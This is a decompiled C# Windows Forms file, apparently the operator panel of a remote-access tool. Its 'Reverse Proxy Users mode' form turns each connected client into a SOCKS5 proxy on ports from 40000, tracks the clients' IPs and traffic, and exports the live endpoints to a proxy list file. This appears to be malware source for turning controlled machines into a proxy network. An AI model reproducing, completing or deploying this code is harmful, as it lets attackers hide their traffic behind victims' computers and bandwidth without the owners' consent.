using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;
using Server.Helper.Sock5;

namespace Server.Forms
{
	// Token: 0x020000A1 RID: 161
	public partial class FormReverseProxyU : FormMaterial
	{
		// Token: 0x06000467 RID: 1127 RVA: 0x00037F84 File Offset: 0x00036184
		public FormReverseProxyU()
		{
			this.InitializeComponent();
			base.FormClosing += this.Closing1;
		}

		// Token: 0x06000468 RID: 1128 RVA: 0x00037FB0 File Offset: 0x000361B0
		public Server.Helper.Sock5.Server[] ServersAll()
		{
			List<Server.Helper.Sock5.Server> list = new List<Server.Helper.Sock5.Server>();
			foreach (object obj in ((IEnumerable)this.GridIps.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((Server.Helper.Sock5.Server)dataGridViewRow.Tag);
			}
			return list.ToArray();
		}

		// Token: 0x06000469 RID: 1129 RVA: 0x00038024 File Offset: 0x00036224
		public Server.Helper.Sock5.Server ServersPort(int port)
		{
			foreach (object obj in ((IEnumerable)this.GridIps.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (((Server.Helper.Sock5.Server)dataGridViewRow.Tag).port == port)
				{
					return (Server.Helper.Sock5.Server)dataGridViewRow.Tag;
				}
			}
			return null;
		}

		// Token: 0x0600046A RID: 1130 RVA: 0x000380A0 File Offset: 0x000362A0
		private void RemoteDesktop_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			if (File.Exists("local\\ReverseProxyU.json"))
			{
				ReverseProxyU reverseProxyU = JsonConvert.DeserializeObject<ReverseProxyU>(File.ReadAllText("local\\ReverseProxyU.json"));
				this.materialSwitch2.Checked = reverseProxyU.AutoStart;
				if (reverseProxyU.AutoStart)
				{
					this.rjButton1.Text = "Stop";
					this.work = true;
				}
			}
			this.Ip = Methods.GetPublicIpAsync();
			this.timer1.Start();
		}

		// Token: 0x0600046B RID: 1131 RVA: 0x0003812C File Offset: 0x0003632C
		private void ChangeScheme(object sender)
		{
			this.GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridIps.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.rjButton1.BackColor = FormMaterial.PrimaryColor;
			this.rjButton2.BackColor = FormMaterial.PrimaryColor;
			this.rjButton3.BackColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x0600046C RID: 1132 RVA: 0x000381C0 File Offset: 0x000363C0
		private void Save()
		{
			File.WriteAllText("local\\ReverseProxyU.json", JsonConvert.SerializeObject(new ReverseProxyU
			{
				AutoStart = this.materialSwitch2.Checked
			}, Formatting.Indented));
		}

		// Token: 0x0600046D RID: 1133 RVA: 0x000381F8 File Offset: 0x000363F8
		public Server.Helper.Sock5.Server NewServer(Clients clients)
		{
			Server.Helper.Sock5.Server server = new Server.Helper.Sock5.Server(clients);
			server.StopedServer += this.Stoped;
			server.DisconnectClientEvent += this.Disconnect;
			server.DisconnectEvent += this.Responce;
			server.StartedServer += this.Started;
			server.ResponceServerEvent += this.Responce;
			base.Invoke(new MethodInvoker(delegate()
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.Tag = server;
				server.Tag = dataGridViewRow;
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.IP
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = this.Ip + ":" + server.port.ToString()
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "Idle"
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = server.clients.Count
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString(server.Recives)
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString(server.Sents)
				});
				this.GridIps.Rows.Add(dataGridViewRow);
			}));
			if (this.rjButton1.Text == "Stop")
			{
				object stlock = this.Stlock;
				lock (stlock)
				{
					server.Start(40000 + this.GridIps.Rows.Count);
				}
			}
			return server;
		}

		// Token: 0x0600046E RID: 1134 RVA: 0x0003831C File Offset: 0x0003651C
		public void Stoped(Server.Helper.Sock5.Server server)
		{
			server.Recives = 0L;
			server.Sents = 0L;
			base.Invoke(new MethodInvoker(delegate()
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)server.Tag;
				dataGridViewRow.Cells[1].Value = this.Ip + ":" + server.port.ToString();
				dataGridViewRow.Cells[2].Value = "Idle";
				dataGridViewRow.Cells[3].Value = server.clients.Count;
				dataGridViewRow.Cells[4].Value = Methods.BytesToString(server.Recives);
				dataGridViewRow.Cells[5].Value = Methods.BytesToString(server.Sents);
			}));
		}

		// Token: 0x0600046F RID: 1135 RVA: 0x0003836C File Offset: 0x0003656C
		public void Disconnect(Server.Helper.Sock5.Server server)
		{
			base.Invoke(new MethodInvoker(delegate()
			{
				this.GridIps.Rows.Remove((DataGridViewRow)server.Tag);
			}));
		}

		// Token: 0x06000470 RID: 1136 RVA: 0x000383A0 File Offset: 0x000365A0
		public void Responce(Server.Helper.Sock5.Server server)
		{
			base.Invoke(new MethodInvoker(delegate()
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)server.Tag;
				dataGridViewRow.Cells[3].Value = server.clients.Count;
				dataGridViewRow.Cells[4].Value = Methods.BytesToString(server.Recives);
				dataGridViewRow.Cells[5].Value = Methods.BytesToString(server.Sents);
			}));
		}

		// Token: 0x06000471 RID: 1137 RVA: 0x000383D0 File Offset: 0x000365D0
		public void Responce(Client client)
		{
			base.Invoke(new MethodInvoker(delegate()
			{
				((DataGridViewRow)client.server.Tag).Cells[3].Value = client.server.clients.Count;
			}));
		}

		// Token: 0x06000472 RID: 1138 RVA: 0x00038400 File Offset: 0x00036600
		public void Started(Server.Helper.Sock5.Server server)
		{
			base.Invoke(new MethodInvoker(delegate()
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)server.Tag;
				dataGridViewRow.Cells[1].Value = this.Ip + ":" + server.port.ToString();
				dataGridViewRow.Cells[2].Value = "Listen";
			}));
		}

		// Token: 0x06000473 RID: 1139 RVA: 0x00038434 File Offset: 0x00036634
		private void rjButton1_Click(object sender, EventArgs e)
		{
			this.Save();
			if (this.rjButton1.Text == "Start")
			{
				int num = 40000;
				foreach (Server.Helper.Sock5.Server server in this.ServersAll())
				{
					object stlock = this.Stlock;
					lock (stlock)
					{
						server.Start(num);
						num++;
					}
				}
				this.rjButton1.Text = "Stop";
				return;
			}
			Server.Helper.Sock5.Server[] array = this.ServersAll();
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Stop();
			}
			this.rjButton1.Text = "Start";
		}

		// Token: 0x06000474 RID: 1140 RVA: 0x000384F8 File Offset: 0x000366F8
		private void Closing1(object sender, FormClosingEventArgs e)
		{
			this.work = false;
			Server.Helper.Sock5.Server[] array = this.ServersAll();
			for (int i = 0; i < array.Length; i++)
			{
				Server.Helper.Sock5.Server server = array[i];
				Task.Run(delegate()
				{
					server.ClientReverse[0].Disconnect();
				});
			}
			this.GridIps.Rows.Clear();
			this.timer1.Stop();
			if (this.rjButton1.Text == "Stop")
			{
				this.rjButton1.Text = "Start";
			}
			base.Hide();
			this.Save();
			e.Cancel = true;
		}

		// Token: 0x06000475 RID: 1141 RVA: 0x00038595 File Offset: 0x00036795
		private void rjButton2_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		// Token: 0x06000476 RID: 1142 RVA: 0x0003859D File Offset: 0x0003679D
		private void timer1_Tick_1(object sender, EventArgs e)
		{
			this.Text = string.Format("Reverse Proxy Users mode [{0}]", this.GridIps.Rows.Count);
		}

		// Token: 0x06000477 RID: 1143 RVA: 0x000385C4 File Offset: 0x000367C4
		private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
		{
			this.Save();
		}

		// Token: 0x06000478 RID: 1144 RVA: 0x000385CC File Offset: 0x000367CC
		private void rjButton3_Click(object sender, EventArgs e)
		{
			List<string> list = new List<string>();
			foreach (object obj in ((IEnumerable)this.GridIps.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if ((string)dataGridViewRow.Cells[2].Value == "Listen")
				{
					list.Add("socks5://" + (string)dataGridViewRow.Cells[1].Value);
				}
			}
			File.WriteAllLines("Proxes.txt", list.ToArray());
			Process.Start("Proxes.txt");
		}

		// Token: 0x040002CE RID: 718
		public bool work;

		// Token: 0x040002CF RID: 719
		public const int port = 40000;

		// Token: 0x040002D0 RID: 720
		public string Ip;

		// Token: 0x040002D1 RID: 721
		public object Stlock = new object();
	}
}
